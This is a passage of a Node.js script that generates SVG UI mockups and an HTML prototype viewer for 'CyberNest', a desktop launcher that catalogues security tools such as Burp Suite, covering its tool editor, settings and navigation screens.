        <text x="28" y="74" class="font-sans" font-size="12" fill="#F8FAFC">Web 渗透测试 (Web Pentest)</text>
        <path d="M6 9l6 6 6-6" transform="translate(244, 64) scale(0.6)" fill="none" stroke="#94A3B8" stroke-width="2" stroke-linecap="round"/>

        <!-- Tags Multi-select -->
        <text x="290" y="44" class="font-sans" font-size="11" font-weight="600" fill="#CBD5E1">关联标签 (支持多选)</text>
        <g transform="translate(290, 52)">
          <rect x="0" y="0" width="270" height="34" rx="6" fill="#162032" stroke="#334155" stroke-width="1"/>
          <!-- Tag 1 -->
          <rect x="6" y="5" width="56" height="24" rx="4" fill="#0EA5E9" fill-opacity="0.2"/>
          <text x="34" y="21" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Web ×</text>
          <!-- Tag 2 -->
          <rect x="68" y="5" width="62" height="24" rx="4" fill="#0EA5E9" fill-opacity="0.2"/>
          <text x="99" y="21" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Proxy ×</text>
          <!-- Tag 3 -->
          <rect x="136" y="5" width="58" height="24" rx="4" fill="#0EA5E9" fill-opacity="0.2"/>
          <text x="165" y="21" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Java ×</text>
          <!-- Add Tag -->
          <text x="236" y="22" class="font-sans" font-size="11" fill="#64748B">+ 增加</text>
        </g>
      </g>

      <!-- Form Section 5: Security Cheatsheet / Memo -->
      <g transform="translate(20, 600)">
        <text x="0" y="14" class="font-sans" font-size="11" font-weight="600" fill="#CBD5E1">参数备忘与快捷指南 (可选)</text>
        <rect x="0" y="22" width="560" height="30" rx="4" fill="#090D14" stroke="#1E293B" stroke-width="1"/>
        <text x="12" y="42" class="font-mono" font-size="10" fill="#64748B">默认监听 127.0.0.1:8080 | CA证书: PortSwiggerCA.der | 扩展插件目录在 extra/extensions</text>
      </g>
    </g>

    <!-- RIGHT COLUMN: Real-Time Live Preview & Diagnostics (Width 370px) -->
    <g transform="translate(620, 0)">
      <rect x="0" y="0" width="370" height="665" rx="8" fill="#111827" stroke="#1E293B" stroke-width="1"/>

      <!-- Header of Right Col -->
      <g transform="translate(18, 16)">
        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" transform="translate(0, 2) scale(0.85)" fill="none" stroke="#0EA5E9" stroke-width="1.8"/>
        <circle cx="10" cy="12" r="3" fill="none" stroke="#0EA5E9" stroke-width="1.8"/>
        <text x="24" y="16" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">即时效果预览 (LIVE PREVIEW)</text>
      </g>
      <line x1="0" y1="56" x2="370" y2="56" stroke="#1E293B" stroke-width="1"/>

      <!-- Live Rendered Card -->
      <g transform="translate(26, 75)">
        <rect x="0" y="0" width="318" height="175" rx="8" fill="url(#cardBgGradient)" stroke="#0EA5E9" stroke-width="1.5" filter="url(#cardShadow)"/>
        <!-- Active Glow Badge -->
        <rect x="14" y="18" width="36" height="36" rx="6" fill="#F97316" fill-opacity="0.2"/>
        <text x="32" y="42" text-anchor="middle" class="font-sans" font-size="18" font-weight="800" fill="#FB923C">B</text>
        <text x="58" y="32" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">Burp Suite Pro</text>
        <rect x="58" y="38" width="70" height="16" rx="4" fill="#10B981" fill-opacity="0.15"/>
        <text x="93" y="50" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#34D399">LOCAL GUI</text>
        <text x="294" y="34" font-size="16" fill="#F59E0B">★</text>
        <text x="14" y="76" class="font-sans" font-size="11" fill="#94A3B8">Web 安全测试、抓包代理与自动化扫描</text>
        <!-- Tags -->
        <g transform="translate(14, 88)">
          <rect x="0" y="0" width="46" height="18" rx="4" fill="#1E293B"/>
          <text x="23" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Web</text>
          <rect x="52" y="0" width="54" height="18" rx="4" fill="#1E293B"/>
          <text x="79" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Proxy</text>
          <rect x="112" y="0" width="50" height="18" rx="4" fill="#1E293B"/>
          <text x="137" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Java</text>
        </g>
        <!-- Bottom Path & Button -->
        <line x1="0" y1="122" x2="318" y2="122" stroke="#1E293B" stroke-width="1"/>
        <text x="14" y="142" class="font-mono" font-size="10" fill="#64748B">D:\\SecTools\\BurpSuitePro.exe</text>
        <g transform="translate(14, 146)">
          <rect x="0" y="0" width="130" height="24" rx="4" fill="url(#emeraldGradient)"/>
          <text x="65" y="16" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">▶ 启动应用程序</text>
          <rect x="140" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
          <path d="M8 4v12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V7.242a2 2 0 0 0-.602-1.43L16.083 2.57A2 2 0 0 0 14.685 2H10a2 2 0 0 0-2 2z" transform="translate(144, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
          <rect x="176" y="0" width="28" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
          <path d="M12 20h9M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" transform="translate(180, 4) scale(0.65)" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
          <rect x="212" y="0" width="76" height="24" rx="4" fill="#1E293B" stroke="#334155" stroke-width="0.8"/>
          <text x="250" y="16" text-anchor="middle" class="font-mono" font-size="10" fill="#94A3B8">··· 菜单</text>
        </g>
      </g>

      <!-- System Diagnostics & Health Check -->
      <g transform="translate(20, 275)">
        <text x="0" y="14" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">系统就绪度诊断 (SYSTEM CHECK)</text>
        <line x1="0" y1="24" x2="330" y2="24" stroke="#1E293B" stroke-width="1"/>

        <!-- Diagnostics Rows -->
        <g transform="translate(0, 38)">
          <rect x="0" y="0" width="330" height="42" rx="6" fill="#162032" stroke="#10B981" stroke-width="1" stroke-opacity="0.5"/>
          <circle cx="20" cy="21" r="5" fill="#10B981"/>
          <text x="34" y="18" class="font-sans" font-size="11" font-weight="700" fill="#F8FAFC">本地文件已验证</text>
          <text x="34" y="32" class="font-mono" font-size="10" fill="#10B981">大小: 248.5 MB · PE 格式有效</text>
        </g>

        <g transform="translate(0, 90)">
          <rect x="0" y="0" width="330" height="42" rx="6" fill="#162032" stroke="#10B981" stroke-width="1" stroke-opacity="0.5"/>
          <circle cx="20" cy="21" r="5" fill="#10B981"/>
          <text x="34" y="18" class="font-sans" font-size="11" font-weight="700" fill="#F8FAFC">依赖运行环境正常</text>
          <text x="34" y="32" class="font-mono" font-size="10" fill="#10B981">系统检测到 OpenJDK 17.0.9 就绪</text>
        </g>

        <g transform="translate(0, 142)">
          <rect x="0" y="0" width="330" height="42" rx="6" fill="#162032" stroke="#0EA5E9" stroke-width="1" stroke-opacity="0.5"/>
          <circle cx="20" cy="21" r="5" fill="#0EA5E9"/>
          <text x="34" y="18" class="font-sans" font-size="11" font-weight="700" fill="#F8FAFC">路径语法规范</text>
          <text x="34" y="32" class="font-mono" font-size="10" fill="#38BDF8">无空格干扰 · 已预设逃逸字符保护</text>
        </g>

        <!-- Test Launch Button -->
        <g transform="translate(0, 210)">
          <rect x="0" y="0" width="330" height="38" rx="6" fill="url(#emeraldGradient)" filter="url(#cardShadow)"/>
          <text x="165" y="24" text-anchor="middle" class="font-sans" font-size="12" font-weight="700" fill="#FFFFFF">▶ 即刻发起测试运行 (Dry-Run Launch)</text>
        </g>
      </g>
    </g>
  </g>
</svg>`;
}

console.log('Add/Edit Tool SVG generator compiled.');

function generateSettingsSvg() {
  return `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 800" width="1280" height="800">
  ${SVG_DEFS}
  <rect width="1280" height="800" rx="10" fill="#0B0F17" stroke="#1E293B" stroke-width="1.5"/>

  ${renderWindowHeader()}
  ${renderSidebar('settings')}

  <!-- Main Content Area: Settings (1040 x 760) -->
  <!-- Top Title Banner -->
  <g transform="translate(264, 52)">
    <text x="0" y="24" class="font-sans" font-size="18" font-weight="700" fill="#F8FAFC">系统设置与数据中枢 (Settings)</text>
    <text x="0" y="44" class="font-sans" font-size="11" fill="#94A3B8">管理桌面端外观偏好、本地 SQLite 存储、数据备份与恢复、全局召唤热键</text>
  </g>

  <!-- 2-Column Split Layout (Y: 110, H: 660) -->
  <g transform="translate(264, 110)">
    <!-- LEFT SUB-NAV: Settings Categories (Width 200px) -->
    <g transform="translate(0, 0)">
      <rect x="0" y="0" width="200" height="660" rx="8" fill="#111827" stroke="#1E293B" stroke-width="1"/>

      <!-- Sub-Tab 1: General & Appearance (Active) -->
      <g transform="translate(8, 14)">
        <rect x="0" y="0" width="184" height="40" rx="6" fill="#1E293B"/>
        <rect x="0" y="0" width="3" height="40" fill="#0EA5E9"/>
        <path d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 1 1-8 0 4 4 0 0 1 8 0z" transform="translate(12, 10) scale(0.85)" fill="none" stroke="#38BDF8" stroke-width="1.8"/>
        <text x="40" y="25" class="font-sans" font-size="12" font-weight="700" fill="#F8FAFC">常规与外观偏好</text>
      </g>

      <!-- Sub-Tab 2: Data & Backup -->
      <g transform="translate(8, 62)">
        <rect x="0" y="0" width="184" height="40" rx="6" fill="transparent"/>
        <path d="M4 7v10c0 2.21 3.58 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.58 4 8 4s8-1.79 8-4M4 7c0-2.21 3.58-4 8-4s8 1.79 8 4m0 5c0 2.21-3.58 4-8 4s-8-1.79-8-4" transform="translate(12, 10) scale(0.85)" fill="none" stroke="#94A3B8" stroke-width="1.8"/>
        <text x="40" y="25" class="font-sans" font-size="12" fill="#94A3B8">数据存储与备份</text>
      </g>

      <!-- Sub-Tab 3: Shortcuts & Hotkeys -->
      <g transform="translate(8, 110)">
        <rect x="0" y="0" width="184" height="40" rx="6" fill="transparent"/>
        <path d="M18 3a3 3 0 0 0-3 3v12a3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3H6a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3V6a3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3h12a3 3 0 0 0 3-3 3 3 0 0 0-3-3z" transform="translate(12, 10) scale(0.85)" fill="none" stroke="#94A3B8" stroke-width="1.8"/>
        <text x="40" y="25" class="font-sans" font-size="12" fill="#94A3B8">快捷键与全局呼出</text>
      </g>

      <!-- Sub-Tab 4: About -->
      <g transform="translate(8, 158)">
        <rect x="0" y="0" width="184" height="40" rx="6" fill="transparent"/>
        <circle cx="21" cy="20" r="9" fill="none" stroke="#94A3B8" stroke-width="1.8"/>
        <line x1="21" y1="16" x2="21" y2="16.01" stroke="#94A3B8" stroke-width="2"/>
        <line x1="21" y1="19" x2="21" y2="24" stroke="#94A3B8" stroke-width="1.8"/>
        <text x="40" y="25" class="font-sans" font-size="12" fill="#94A3B8">关于 CyberNest</text>
      </g>
    </g>

    <!-- RIGHT PANEL: Settings Form Content (Width 770px) -->
    <g transform="translate(220, 0)">
      <rect x="0" y="0" width="770" height="660" rx="8" fill="#111827" stroke="#1E293B" stroke-width="1"/>

      <!-- Group 1: Appearance & Theme -->
      <g transform="translate(24, 18)">
        <text x="0" y="14" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">1. 外观与主题偏好 (APPEARANCE)</text>
        <line x1="0" y1="24" x2="722" y2="24" stroke="#1E293B" stroke-width="1"/>

        <!-- Theme Mode 3-Card Selector -->
        <text x="0" y="44" class="font-sans" font-size="11" font-weight="600" fill="#CBD5E1">界面模式 (Theme Mode)</text>
        <g transform="translate(0, 52)">
          <!-- Dark Theme (Active) -->
          <g transform="translate(0, 0)">
            <rect x="0" y="0" width="230" height="72" rx="6" fill="#162032" stroke="#0EA5E9" stroke-width="1.5"/>
            <circle cx="24" cy="26" r="8" fill="#0B0F17" stroke="#0EA5E9" stroke-width="1.5"/>
            <circle cx="24" cy="26" r="4" fill="#0EA5E9"/>
            <text x="44" y="30" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">深色暗夜 (Cyber Dark)</text>
            <text x="44" y="50" class="font-sans" font-size="11" fill="#38BDF8">默认护眼 · 专业极客风格 (推荐)</text>
          </g>

          <!-- Light Theme -->
          <g transform="translate(245, 0)">
            <rect x="0" y="0" width="230" height="72" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
            <circle cx="24" cy="26" r="8" fill="#FFFFFF" stroke="#94A3B8" stroke-width="1.5"/>
            <text x="44" y="30" class="font-sans" font-size="13" font-weight="500" fill="#CBD5E1">浅色明亮 (Clean Light)</text>
            <text x="44" y="50" class="font-sans" font-size="11" fill="#64748B">高对比度明亮视窗</text>
          </g>

          <!-- System Auto -->
          <g transform="translate(490, 0)">
            <rect x="0" y="0" width="230" height="72" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
            <circle cx="24" cy="26" r="8" fill="none" stroke="#94A3B8" stroke-width="1.5"/>
            <text x="44" y="30" class="font-sans" font-size="13" font-weight="500" fill="#CBD5E1">跟随系统 (System Auto)</text>
            <text x="44" y="50" class="font-sans" font-size="11" fill="#64748B">自动同步操作系统明暗主题</text>
          </g>
        </g>

        <!-- Accent Colors -->
        <text x="0" y="152" class="font-sans" font-size="11" font-weight="600" fill="#CBD5E1">强调色彩预设 (Accent Colors)</text>
        <g transform="translate(0, 160)">
          <!-- Cyan Active -->
          <rect x="0" y="0" width="140" height="34" rx="6" fill="#1E293B" stroke="#0EA5E9" stroke-width="1.2"/>
          <circle cx="20" cy="17" r="6" fill="#0EA5E9"/>
          <text x="34" y="21" class="font-sans" font-size="11" font-weight="700" fill="#38BDF8">Cyber Cyan</text>

          <!-- Green -->
          <rect x="150" y="0" width="140" height="34" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <circle cx="170" cy="17" r="6" fill="#10B981"/>
          <text x="184" y="21" class="font-sans" font-size="11" fill="#94A3B8">Terminal Green</text>

          <!-- Purple -->
          <rect x="300" y="0" width="140" height="34" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <circle cx="320" cy="17" r="6" fill="#A855F7"/>
          <text x="334" y="21" class="font-sans" font-size="11" fill="#94A3B8">Hacker Violet</text>
        </g>
      </g>

      <!-- Group 2: Desktop Lifecycle & System Tray -->
      <g transform="translate(24, 235)">
        <text x="0" y="14" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">2. 系统启动与后台托盘行为 (LIFECYCLE)</text>
        <line x1="0" y1="24" x2="722" y2="24" stroke="#1E293B" stroke-width="1"/>

        <!-- Toggle 1: Auto Start -->
        <g transform="translate(0, 36)">
          <text x="0" y="16" class="font-sans" font-size="12" font-weight="600" fill="#CBD5E1">开机自动静默启动 CyberNest</text>
          <text x="0" y="32" class="font-sans" font-size="11" fill="#64748B">在系统开机引导完成后静默载入托盘，随时响应全局召唤</text>
          <!-- Switch ON -->
          <rect x="660" y="6" width="46" height="24" rx="12" fill="#0EA5E9"/>
          <circle cx="693" cy="18" r="9" fill="#FFFFFF"/>
        </g>

        <!-- Toggle 2: Close to Tray -->
        <g transform="translate(0, 80)">
          <text x="0" y="16" class="font-sans" font-size="12" font-weight="600" fill="#CBD5E1">关闭窗口时最小化至系统托盘 (System Tray)</text>
          <text x="0" y="32" class="font-sans" font-size="11" fill="#64748B">点击窗口右上角关闭按钮时不退出进程，保障后台扫描任务稳定存活</text>
          <!-- Switch ON -->
          <rect x="660" y="6" width="46" height="24" rx="12" fill="#0EA5E9"/>
          <circle cx="693" cy="18" r="9" fill="#FFFFFF"/>
        </g>
      </g>

      <!-- Group 3: SQLite Data & Backup -->
      <g transform="translate(24, 380)">
        <text x="0" y="14" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">3. 数据存储与安全备份 (DATA &amp; BACKUP)</text>
        <line x1="0" y1="24" x2="722" y2="24" stroke="#1E293B" stroke-width="1"/>

        <!-- DB Status Card -->
        <g transform="translate(0, 34)">
          <rect x="0" y="0" width="722" height="60" rx="6" fill="#162032" stroke="#1E293B" stroke-width="1"/>
          <circle cx="24" cy="30" r="5" fill="#10B981"/>
          <text x="40" y="24" class="font-sans" font-size="12" font-weight="700" fill="#F8FAFC">本地 SQLite 数据库就绪: <tspan class="font-mono" fill="#38BDF8">D:\\AIAgent\\CyberNest\\data\\cybernest.db</tspan></text>
          <text x="40" y="44" class="font-sans" font-size="11" fill="#94A3B8">已存储: 48 款安全工具 · 8 个分类 · 24 个标签 · 162 条运行审计历史 · 数据库体积: 4.2 MB</text>
        </g>

        <!-- Action Buttons Row -->
        <g transform="translate(0, 106)">
          <!-- Export -->
          <rect x="0" y="0" width="160" height="34" rx="6" fill="#1E293B" stroke="#0EA5E9" stroke-width="1"/>
          <text x="80" y="21" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#38BDF8">📥 导出完整备份 (.json)</text>

          <!-- Restore -->
          <rect x="175" y="0" width="160" height="34" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
          <text x="255" y="21" text-anchor="middle" class="font-sans" font-size="11" fill="#CBD5E1">📤 从备份文件恢复</text>

          <!-- Browser Bookmarks -->
          <rect x="350" y="0" width="170" height="34" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
          <text x="435" y="21" text-anchor="middle" class="font-sans" font-size="11" fill="#CBD5E1">📑 导入浏览器书签</text>
        </g>
      </g>

      <!-- Group 4: Global Summon Hotkey -->
      <g transform="translate(24, 545)">
        <text x="0" y="14" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">4. 全局快捷键与召唤 (GLOBAL SUMMON)</text>
        <line x1="0" y1="24" x2="722" y2="24" stroke="#1E293B" stroke-width="1"/>

        <g transform="translate(0, 32)">
          <text x="0" y="20" class="font-sans" font-size="12" font-weight="600" fill="#CBD5E1">全局呼出悬浮启动窗口 (Spotlight / Raycast Mode)</text>
          <!-- Hotkey Recorder Box -->
          <rect x="540" y="0" width="166" height="34" rx="6" fill="#162032" stroke="#0EA5E9" stroke-width="1.2"/>
          <text x="623" y="21" text-anchor="middle" class="font-mono" font-size="12" font-weight="700" fill="#38BDF8">Alt + Space</text>
        </g>
      </g>
    </g>
  </g>
  ${renderStatusBar('settings')}
</svg>`;
}
console.log('Settings SVG generator compiled.');

function generateIndexHtml() {
  return `<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CyberNest - 桌面端高保真原型交互预览中心</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-dark: #070A0F;
      --panel-dark: #0F172A;
      --card-dark: #1E293B;
      --border-dark: #334155;
      --accent-cyan: #0EA5E9;
      --accent-green: #10B981;
    }
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background-color: var(--bg-dark);
      color: #F8FAFC;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      overflow-x: hidden;
    }
    /* Top Hub Header */
    header {
      background: rgba(15, 23, 42, 0.9);
      backdrop-filter: blur(12px);
      border-bottom: 1px solid var(--border-dark);
      padding: 12px 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: sticky;
      top: 0;
      z-index: 100;
    }
    .logo-area {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .badge {
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      padding: 2px 8px;
      border-radius: 4px;
      background: #1E293B;
      color: #38BDF8;
      border: 1px solid rgba(14, 165, 233, 0.4);
    }
    /* Page Nav Tabs */
    .tab-bar {
      display: flex;
      gap: 8px;
      background: #0B0F17;
      padding: 4px;
      border-radius: 8px;
      border: 1px solid #1E293B;
    }
    .tab-btn {
      background: transparent;
      border: none;
      color: #94A3B8;
      padding: 8px 16px;
      font-size: 13px;
      font-weight: 500;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.2s ease;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .tab-btn:hover {
      color: #F8FAFC;
      background: rgba(255, 255, 255, 0.05);
    }
    .tab-btn.active {
      background: #0EA5E9;
      color: #FFFFFF;
      font-weight: 600;
      box-shadow: 0 0 12px rgba(14, 165, 233, 0.4);
    }
    /* Zoom & Fullscreen Controls */
    .control-tools {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .ctrl-btn {
      background: #1E293B;
      border: 1px solid #334155;
      color: #CBD5E1;
      padding: 6px 12px;
      border-radius: 6px;
      font-size: 12px;
      cursor: pointer;
      transition: all 0.15s ease;
    }
    .ctrl-btn:hover {
      background: #334155;
      color: #FFFFFF;
    }
    /* Prototype Stage */
    main {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px;
      gap: 16px;
    }
    .stage-container {
      width: 100%;
      max-width: 1280px;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 1px 1px rgba(51, 65, 85, 0.6);
      background: #0B0F17;
      display: flex;
      justify-content: center;
    }
    .stage-container img, .stage-container object {
      width: 100%;
      height: auto;
      display: block;
      aspect-ratio: 1280 / 800;
    }
    /* Info Card */
    .info-bar {
      max-width: 1280px;
      width: 100%;
      background: #0F172A;
      border: 1px solid #1E293B;
      border-radius: 8px;
      padding: 14px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 13px;
      color: #94A3B8;
    }
    .info-bar strong {
      color: #F8FAFC;
    }
  </style>
</head>
<body>
  <header>
    <div class="logo-area">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
        <path d="M12 2L3 6v6c0 6 4.5 11.5 9 12 4.5-.5 9-6 9-12V6l-9-4z" fill="#0EA5E9" fill-opacity="0.2" stroke="#0EA5E9" stroke-width="2"/>
        <path d="M8 12l3 3 6-6" stroke="#38BDF8" stroke-width="2" stroke-linecap="round"/>
      </svg>
      <strong style="font-size: 15px; letter-spacing: 0.5px;">CyberNest</strong>
      <span class="badge">PROTOTYPE HUB</span>
    </div>

    <!-- Navigation Tabs -->
    <nav class="tab-bar">
      <button class="tab-btn active" onclick="switchTab('01_dashboard.svg', this, '1. 首页 (Dashboard) - 高频安全工具秒级作战台')">1. 首页 Dashboard</button>
      <button class="tab-btn" onclick="switchTab('02_all_tools.svg', this, '2. 全部工具 (All Tools) - 48款资产卡片/列表双模矩阵')">2. 全部工具</button>
      <button class="tab-btn" onclick="switchTab('03_categories.svg', this, '3. 分类与标签管理 (Taxonomy Studio) - 8大层级与24个标签')">3. 分类与标签管理</button>
      <button class="tab-btn" onclick="switchTab('04_add_edit_tool.svg', this, '4. 添加/编辑工具 (Tool Studio) - 独立沉浸式工作台与实时卡片预览')">4. 添加/编辑工具</button>
      <button class="tab-btn" onclick="switchTab('05_settings.svg', this, '5. 系统设置 (Settings) - 本地SQLite安全备份、外观与全局召唤')">5. 系统设置</button>
    </nav>

    <div class="control-tools">
      <button class="ctrl-btn" onclick="openRawSvg()">在新标签页查看原始 SVG</button>
    </div>
  </header>

  <main>
    <div class="stage-container">
      <img id="protoView" src="01_dashboard.svg" alt="CyberNest Prototype Screen">
    </div>

    <div class="info-bar">
      <div id="pageDesc">
        <strong>当前视窗:</strong> 1. 首页 (Dashboard) - 高频安全工具秒级作战台 (标准分辨率 1280 x 800)
      </div>
      <div>
        技术底座: <span class="badge">Tauri 2.0</span> + <span class="badge">React 18</span> + <span class="badge">Tailwind CSS</span>
      </div>
    </div>
  </main>

  <script>
    let currentSvg = '01_dashboard.svg';

    function switchTab(svgFile, btn, desc) {
      currentSvg = svgFile;
      document.getElementById('protoView').src = svgFile;
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      document.getElementById('pageDesc').innerHTML = '<strong>当前视窗:</strong> ' + desc + ' (标准分辨率 1280 x 800)';
    }

    function openRawSvg() {
      window.open(currentSvg, '_blank');
    }
  </script>
</body>
</html>`;
}

// Write out all 5 SVGs + index.html
console.log('Writing files to:', OUT_DIR);

fs.writeFileSync(path.join(OUT_DIR, '01_dashboard.svg'), generateDashboardSvg());
console.log('✔ Generated: 01_dashboard.svg');

fs.writeFileSync(path.join(OUT_DIR, '02_all_tools.svg'), generateAllToolsSvg());
console.log('✔ Generated: 02_all_tools.svg');

fs.writeFileSync(path.join(OUT_DIR, '03_categories.svg'), generateCategoriesSvg());
console.log('✔ Generated: 03_categories.svg');

fs.writeFileSync(path.join(OUT_DIR, '04_add_edit_tool.svg'), generateAddEditToolSvg());
console.log('✔ Generated: 04_add_edit_tool.svg');

fs.writeFileSync(path.join(OUT_DIR, '05_settings.svg'), generateSettingsSvg());
console.log('✔ Generated: 05_settings.svg');

fs.writeFileSync(path.join(OUT_DIR, 'index.html'), generateIndexHtml());
console.log('✔ Generated: index.html (Interactive Prototype Hub)');

console.log('\nAll 5 prototype files generated successfully!');
